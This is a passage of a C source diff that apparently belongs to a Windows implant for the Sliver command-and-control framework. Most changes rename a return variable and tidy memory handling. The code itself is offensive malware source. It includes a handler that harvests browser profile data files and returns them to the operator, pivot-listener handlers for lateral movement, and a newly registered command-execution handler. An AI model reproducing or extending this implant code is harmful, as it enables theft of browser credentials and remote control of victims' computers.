 	PPBElement pFinalElement = NULL;
 	HANDLE hToken = NULL;
@@ -3185,9 +3316,9 @@ PENVELOPE CurrentTokenOwnerHandler
 	}
 
 	pFinalElement = CreateBytesElement(lpTokenOwner, lstrlenA(lpTokenOwner), 1);
-	pRespEnvelope = ALLOC(sizeof(ENVELOPE));
-	pRespEnvelope->uID = pEnvelope->uID;
-	pRespEnvelope->pData = BufferMove(pFinalElement->pMarshaledData, pFinalElement->cbMarshaledData);
+	pResult = ALLOC(sizeof(ENVELOPE));
+	pResult->uID = pEnvelope->uID;
+	pResult->pData = BufferMove(pFinalElement->pMarshaledData, pFinalElement->cbMarshaledData);
 	pFinalElement->pMarshaledData = NULL;
 CLEANUP:
 	if (hToken != NULL) {
@@ -3198,7 +3329,7 @@ CLEANUP:
 	FREE(lpTokenOwner);
 	FreeElement(pFinalElement);
 
-	return pRespEnvelope;
+	return pResult;
 }
 
 PENVELOPE GetPrivsHandler
@@ -3206,7 +3337,7 @@ PENVELOPE GetPrivsHandler
 	_In_ PENVELOPE pEnvelope
 )
 {
-	PENVELOPE pRespEnvelope = NULL;
+	PENVELOPE pResult = NULL;
 	DWORD i = 0;
 	DWORD j = 0;
 	PPBElement PrivInfo[6];
@@ -3214,7 +3345,6 @@ PENVELOPE GetPrivsHandler
 	PPBElement* PrivelegeList = NULL;
 	PPBElement pFinalElement = NULL;
 	HANDLE hToken = NULL;
-	PTOKEN_USER pTokenUser = NULL;
 	PTOKEN_PRIVILEGES pTokenPrivileges = NULL;
 	CHAR szProcessPath[MAX_PATH];
 	LPSTR lpProcessName = NULL;
@@ -3227,6 +3357,7 @@ PENVELOPE GetPrivsHandler
 	DWORD dwLastError = 0;
 	PLUID_AND_ATTRIBUTES pPrivilege;
 
+	SecureZeroMemory(szProcessPath, sizeof(szProcessPath));
 	if (!OpenProcessToken(GetCurrentProcess(), TOKEN_QUERY, &hToken)) {
 		LOG_ERROR("OpenProcessToken", GetLastError());
 		goto CLEANUP;
@@ -3234,16 +3365,14 @@ PENVELOPE GetPrivsHandler
 
 	pTokenPrivileges = GetTokenPrivileges(hToken);
 	if (pTokenPrivileges == NULL) {
-		LOG_ERROR("GetTokenPrivileges", GetLastError());
 		goto CLEANUP;
 	}
 
 	SetLastError(ERROR_SUCCESS);
-	SecureZeroMemory(szProcessPath, sizeof(szProcessPath));
 	dwReturnedValue = GetModuleFileNameA(NULL, szProcessPath, _countof(szProcessPath));
 	dwLastError = GetLastError();
 	if (dwReturnedValue == 0 || dwLastError == ERROR_INSUFFICIENT_BUFFER) {
-		LOG_ERROR("GetModuleFileNameA", GetLastError());
+		LOG_ERROR("GetModuleFileNameA", dwLastError);
 		goto CLEANUP;
 	}
 
@@ -3253,45 +3382,42 @@ PENVELOPE GetPrivsHandler
 	RespElement[1] = CreateBytesElement(lpProcessIntegrity, lstrlenA(lpProcessIntegrity), 2);
 	PrivelegeList = ALLOC(sizeof(PPBElement) * pTokenPrivileges->PrivilegeCount);
 	for (i = 0; i < pTokenPrivileges->PrivilegeCount; i++) {
-		for (j = 0; j < _countof(PrivInfo); j++) {
-			SecureZeroMemory(szPrivName, sizeof(szPrivName));
-			SecureZeroMemory(szDisplayName, sizeof(szDisplayName));
-			SecureZeroMemory(PrivInfo, sizeof(PrivInfo));
+		SecureZeroMemory(szPrivName, sizeof(szPrivName));
+		SecureZeroMemory(szDisplayName, sizeof(szDisplayName));
+		SecureZeroMemory(PrivInfo, sizeof(PrivInfo));
 
-			pPrivilege = &pTokenPrivileges->Privileges[i];
-			dwTemp = _countof(szPrivName);
-			LookupPrivilegeNameA(NULL, &pPrivilege->Luid, szPrivName, &dwTemp);
-			PrivInfo[0] = CreateBytesElement(szPrivName, lstrlenA(szPrivName), 1);
-			dwTemp = _countof(szDisplayName);
-			LookupPrivilegeDisplayNameA(NULL, szPrivName, szDisplayName, &dwTemp, &dwLanguageId);
-			PrivInfo[1] = CreateBytesElement(szDisplayName, lstrlenA(szDisplayName), 2);
-			PrivInfo[2] = CreateVarIntElement((pPrivilege->Attributes & SE_PRIVILEGE_ENABLED) != 0, 3);
-			PrivInfo[3] = CreateVarIntElement((pPrivilege->Attributes & SE_PRIVILEGE_ENABLED_BY_DEFAULT) != 0, 4);
-			PrivInfo[4] = CreateVarIntElement((pPrivilege->Attributes & SE_PRIVILEGE_REMOVED) != 0, 5);
-			PrivInfo[5] = CreateVarIntElement((pPrivilege->Attributes & SE_PRIVILEGE_USED_FOR_ACCESS) != 0, 6);
-		}
+		pPrivilege = &pTokenPrivileges->Privileges[i];
+		dwTemp = _countof(szPrivName);
+		LookupPrivilegeNameA(NULL, &pPrivilege->Luid, szPrivName, &dwTemp);
+		PrivInfo[0] = CreateBytesElement(szPrivName, lstrlenA(szPrivName), 1);
+		dwTemp = _countof(szDisplayName);
+		LookupPrivilegeDisplayNameA(NULL, szPrivName, szDisplayName, &dwTemp, &dwLanguageId);
+		PrivInfo[1] = CreateBytesElement(szDisplayName, lstrlenA(szDisplayName), 2);
+		PrivInfo[2] = CreateVarIntElement((pPrivilege->Attributes & SE_PRIVILEGE_ENABLED) != 0, 3);
+		PrivInfo[3] = CreateVarIntElement((pPrivilege->Attributes & SE_PRIVILEGE_ENABLED_BY_DEFAULT) != 0, 4);
+		PrivInfo[4] = CreateVarIntElement((pPrivilege->Attributes & SE_PRIVILEGE_REMOVED) != 0, 5);
+		PrivInfo[5] = CreateVarIntElement((pPrivilege->Attributes & SE_PRIVILEGE_USED_FOR_ACCESS) != 0, 6);
 
 		PrivelegeList[i] = CreateStructElement(PrivInfo, _countof(PrivInfo), 0);
 	}
 
 	RespElement[0] = CreateRepeatedStructElement(PrivelegeList, pTokenPrivileges->PrivilegeCount, 1);
 	pFinalElement = CreateStructElement(RespElement, _countof(RespElement), 0);
-	pRespEnvelope = ALLOC(sizeof(ENVELOPE));
-	pRespEnvelope->uID = pEnvelope->uID;
-	pRespEnvelope->pData = BufferMove(pFinalElement->pMarshaledData, pFinalElement->cbMarshaledData);
+	pResult = ALLOC(sizeof(ENVELOPE));
+	pResult->uID = pEnvelope->uID;
+	pResult->pData = BufferMove(pFinalElement->pMarshaledData, pFinalElement->cbMarshaledData);
 	pFinalElement->pMarshaledData = NULL;
 CLEANUP:
 	if (hToken != NULL) {
 		CloseHandle(hToken);
 	}
 
-	FREE(pTokenUser);
 	FREE(PrivelegeList);
 	FREE(lpProcessIntegrity);
 	FREE(pTokenPrivileges);
 	FreeElement(pFinalElement);
 
-	return pRespEnvelope;
+	return pResult;
 }
 
 PENVELOPE BrowserHandler
@@ -3301,7 +3427,7 @@ PENVELOPE BrowserHandler
 {
 	PUSER_DATA* pUserDatas = NULL;
 	DWORD dwNumberOfUserDatas = 0;
-	PENVELOPE pRespEnvelope = NULL;
+	PENVELOPE pResult = NULL;
 	DWORD i = 0;
 	DWORD j = 0;
 	DWORD k = 0;
@@ -3330,6 +3456,10 @@ PENVELOPE BrowserHandler
 	*/
 
 	pUserDatas = PickBrowsers(&dwNumberOfUserDatas);
+	if (pUserDatas == NULL || dwNumberOfUserDatas == 0) {
+		goto CLEANUP;
+	}
+
 	for (i = 0; i < dwNumberOfUserDatas; i++) {
 		pUserData = pUserDatas[i];
 		dwNumberOfProfiles += pUserData->cProfile;
@@ -3363,8 +3493,9 @@ PENVELOPE BrowserHandler
 						ItemType[1] = CreateBytesElement(pItemFileData, cbItemFileData, 2);
 
 						pItemList[dwNumberOfItems++] = CreateStructElement(ItemType, _countof(ItemType), 0);
-						FREE(pItemFileData);
 					}
+
+					FREE(pItemFileData);
 				}
 			}
 
@@ -3376,9 +3507,9 @@ PENVELOPE BrowserHandler
 	}
 
 	pFinalElement = CreateRepeatedStructElement(pProfileList, dwNumberOfProfiles, 1);
-	pRespEnvelope = ALLOC(sizeof(ENVELOPE));
-	pRespEnvelope->uID = pEnvelope->uID;
-	pRespEnvelope->pData = BufferMove(pFinalElement->pMarshaledData, pFinalElement->cbMarshaledData);
+	pResult = ALLOC(sizeof(ENVELOPE));
+	pResult->uID = pEnvelope->uID;
+	pResult->pData = BufferMove(pFinalElement->pMarshaledData, pFinalElement->cbMarshaledData);
 	pFinalElement->pMarshaledData = NULL;
 CLEANUP:
 	FreeElement(pFinalElement);
@@ -3389,7 +3520,7 @@ CLEANUP:
 	FREE(pUserDatas);
 	FREE(pProfileList);
 
-	return pRespEnvelope;
+	return pResult;
 }
 
 PENVELOPE PivotStartListenerHandler
@@ -3398,7 +3529,7 @@ PENVELOPE PivotStartListenerHandler
 	_In_ LPVOID lpSliverClient
 )
 {
-	PENVELOPE pRespEnvelope = NULL;
+	PENVELOPE pResult = NULL;
 	PPBElement PivotStartListenerReq[3];
 	PPBElement RespElements[4];
 	PPBElement pFinalElement = NULL;
@@ -3467,9 +3598,9 @@ PENVELOPE PivotStartListenerHandler
 	RespElements[3] = NULL;
 
 	pFinalElement = CreateStructElement(RespElements, _countof(RespElements), 0);
-	pRespEnvelope = ALLOC(sizeof(ENVELOPE));
-	pRespEnvelope->uID = pEnvelope->uID;
-	pRespEnvelope->pData = BufferMove(pFinalElement->pMarshaledData, pFinalElement->cbMarshaledData);
+	pResult = ALLOC(sizeof(ENVELOPE));
+	pResult->uID = pEnvelope->uID;
+	pResult->pData = BufferMove(pFinalElement->pMarshaledData, pFinalElement->cbMarshaledData);
 	pFinalElement->pMarshaledData = NULL;
 CLEANUP:
 	for (i = 0; i < _countof(PivotStartListenerReq); i++) {
@@ -3484,7 +3615,7 @@ CLEANUP:
 
 	FreeElement(pFinalElement);
 
-	return pRespEnvelope;
+	return pResult;
 }
 
 PENVELOPE PivotPeerEnvelopeHandler
@@ -3638,7 +3769,6 @@ PENVELOPE PivotListenersHandler
 	DWORD j = 0;
 	PPIVOT_LISTENER pListener = NULL;
 	PPIVOT_CONNECTION pConnection = NULL;
-	PENVELOPE pResult = NULL;
 	PPBElement PivotListener[5];
 	PPBElement NetConnPivot[2];
 	PPBElement Listeners[2];
@@ -3646,7 +3776,7 @@ PENVELOPE PivotListenersHandler
 	PPBElement* ListenerList = NULL;
 	PPBElement pFinalElement = NULL;
 	DWORD dwIdx = 0;
-	PENVELOPE pRespEnvelope = NULL;
+	PENVELOPE pResult = NULL;
 
 	pSession = (PSLIVER_SESSION_CLIENT)lpSliverClient;
 	pConfig = pSession->pGlobalConfig;
@@ -3689,15 +3819,15 @@ PENVELOPE PivotListenersHandler
 	Listeners[0] = CreateRepeatedStructElement(ListenerList, dwIdx, 1);
 	Listeners[1] = NULL;
 	pFinalElement = CreateStructElement(Listeners, _countof(Listeners), 0);
-	pRespEnvelope = ALLOC(sizeof(ENVELOPE));
-	pRespEnvelope->uID = pEnvelope->uID;
-	pRespEnvelope->pData = BufferMove(pFinalElement->pMarshaledData, pFinalElement->cbMarshaledData);
+	pResult = ALLOC(sizeof(ENVELOPE));
+	pResult->uID = pEnvelope->uID;
+	pResult->pData = BufferMove(pFinalElement->pMarshaledData, pFinalElement->cbMarshaledData);
 	pFinalElement->pMarshaledData = NULL;
 CLEANUP:
 	FreeElement(pFinalElement);
 	FREE(ListenerList);
 
-	return pRespEnvelope;
+	return pResult;
 }
 
 PENVELOPE KillHandler
@@ -3740,6 +3870,7 @@ REQUEST_HANDLER* GetSystemHandler()
 	//HandlerList[MsgCpReq] = CpHandler;
 	HandlerList[MsgMkdirReq] = MkdirHandler;
 	HandlerList[MsgExecuteReq] = ExecuteHandler;
+	HandlerList[MsgCmdReq] = CmdHandler;
 	HandlerList[MsgBrowserReq] = BrowserHandler;
 	HandlerList[MsgKillSessionReq] = KillHandler;
 	
